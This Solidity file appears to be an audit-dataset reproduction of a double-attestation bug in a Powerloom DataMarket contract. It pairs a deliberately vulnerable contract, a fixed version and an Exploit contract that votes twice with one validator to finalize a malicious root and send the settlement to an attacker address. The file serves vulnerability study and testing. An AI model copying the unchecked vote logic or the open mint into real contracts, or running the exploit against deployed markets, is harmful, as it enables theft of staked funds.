// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * AuditVault 58812 — Powerloom L2 DataMarket.submitBatchAttestation (Quantstamp).
 * A validator can submit an attestation for the same batch more than once.
 * The mapping attestationsReceived exists but is never checked, so one validator's
 * second vote is counted and a malicious root reaches the finalization threshold
 * (2) without a second validator. Finalization releases the batch settlement.
 */

contract RewardToken {
    string public name = "Powerloom settlement";
    string public symbol = "PLSET";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DataMarket {
    uint256 public constant THRESHOLD = 2;
    uint256 public constant SETTLEMENT = 100 ether;

    RewardToken public reward;
    mapping(address => bool) public isValidator;
    mapping(bytes32 => mapping(address => bool)) public attestationsReceived;
    mapping(bytes32 => mapping(bytes32 => uint256)) public votes;
    mapping(bytes32 => bytes32) public finalizedRoot;
    mapping(bytes32 => bool) public finalized;
    address public settlementTo;

    constructor(RewardToken _reward) {
        reward = _reward;
        reward.mint(address(this), SETTLEMENT);
    }

    function addValidator(address who) external {
        isValidator[who] = true;
    }

    function submitBatchAttestation(address market, string calldata batchCid, uint256 epochId, bytes32 root) external {
        require(isValidator[msg.sender], "validator");
        bytes32 batch = keccak256(abi.encode(market, batchCid, epochId));
        // Missing: require(!attestationsReceived[batch][tx.origin]);
        // @> VULN:
        votes[batch][root] += 1;
        if (votes[batch][root] >= THRESHOLD && !finalized[batch]) {
            finalized[batch] = true;
            finalizedRoot[batch] = root;
            settlementTo = msg.sender;
            reward.transfer(msg.sender, SETTLEMENT);
        }
    }
}

contract DataMarketFixed {
    uint256 public constant THRESHOLD = 2;
    uint256 public constant SETTLEMENT = 100 ether;

    RewardToken public reward;
    mapping(address => bool) public isValidator;
    mapping(bytes32 => mapping(address => bool)) public attestationsReceived;
    mapping(bytes32 => mapping(bytes32 => uint256)) public votes;
    bool public finalized;

    constructor(RewardToken _reward) {
        reward = _reward;
        reward.mint(address(this), SETTLEMENT);
    }

    function addValidator(address who) external {
        isValidator[who] = true;
    }

    function submitBatchAttestation(address market, string calldata batchCid, uint256 epochId, bytes32 root) external {
        require(isValidator[msg.sender], "validator");
        bytes32 batch = keccak256(abi.encode(market, batchCid, epochId));
        require(!attestationsReceived[batch][tx.origin], "already attested");
        attestationsReceived[batch][tx.origin] = true;
        votes[batch][root] += 1;
        if (votes[batch][root] >= THRESHOLD) {
            finalized = true;
            reward.transfer(msg.sender, SETTLEMENT);
        }
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant MARKET = address(uint160(0xA11));
    bytes32 internal constant MALICIOUS = keccak256("test-hash1");

    RewardToken public reward;
    DataMarket public market;
    uint256 public paid;

    function run() external {
        reward = new RewardToken();
        market = new DataMarket(reward);
        market.addValidator(address(this));

        market.submitBatchAttestation(MARKET, "QmbWqxBEKC3P8tqsKc98xmWNzrzDtRLMiMPL8wBuTGsMnX", 1, MALICIOUS);
        require(!market.finalized(keccak256(abi.encode(MARKET, "QmbWqxBEKC3P8tqsKc98xmWNzrzDtRLMiMPL8wBuTGsMnX", uint256(1)))), "early");

        market.submitBatchAttestation(MARKET, "QmbWqxBEKC3P8tqsKc98xmWNzrzDtRLMiMPL8wBuTGsMnX", 1, MALICIOUS);

        bytes32 batch = keccak256(abi.encode(MARKET, "QmbWqxBEKC3P8tqsKc98xmWNzrzDtRLMiMPL8wBuTGsMnX", uint256(1)));
        require(market.finalized(batch), "not final");
        require(market.finalizedRoot(batch) == MALICIOUS, "root");
        require(market.votes(batch, MALICIOUS) == 2, "votes");
        paid = reward.balanceOf(address(this));
        require(paid == 100 ether, "settlement");
        reward.transfer(ATTACKER, paid);
    }
}
